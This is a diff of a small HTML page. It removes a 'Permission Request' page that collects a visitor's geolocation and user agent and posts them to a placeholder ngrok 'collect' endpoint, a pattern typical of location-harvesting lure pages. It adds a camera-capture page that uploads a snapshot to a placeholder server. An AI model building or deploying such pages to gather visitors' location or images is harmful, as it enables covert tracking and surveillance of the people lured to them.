@@ -1,36 +1,39 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>Permission Request</title>
+  <meta charset="UTF-8"/>
+  <title>Photo Permission & Upload</title>
 </head>
 <body>
-<h2>Please allow location access</h2>
-<button onclick="getLocation()">Share Location</button>
+  <h1>Allow Photo Permission and Upload</h1>
+  <button id="snap">Take Photo</button>
+  <video id="video" width="320" height="240" autoplay></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+  <button id="upload" style="display:none;">Upload Photo</button>
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const snap = document.getElementById('snap');
+    const upload = document.getElementById('upload');
 
-<script>
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(sendData, showError);
-  } else {
-    alert("Geolocation not supported");
-  }
-}
+    snap.onclick = async () => {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true }); // Ask permission
+      video.srcObject = stream;
+      upload.style.display = 'inline';
+    };
 
-function sendData(position) {
-  fetch("https://YOUR_NGROK_URL/collect", { // Change later
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      latitude: position.coords.latitude,
-      longitude: position.coords.longitude,
-      userAgent: navigator.userAgent
-    })
-  });
-}
-
-function showError(error) {
-  alert("Permission denied or error getting location.");
-}
-</script>
+    upload.onclick = () => {
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      // Convert image to base64
+      const imageData = canvas.toDataURL('image/png');
+      // TODO: POST imageData to your server
+      fetch('https://your-server.com/upload', {
+        method: 'POST',
+        body: JSON.stringify({ image: imageData }),
+        headers: { 'Content-Type': 'application/json' }
+      });
+      alert('Photo uploaded!');
+    };
+  </script>
 </body>
 </html>
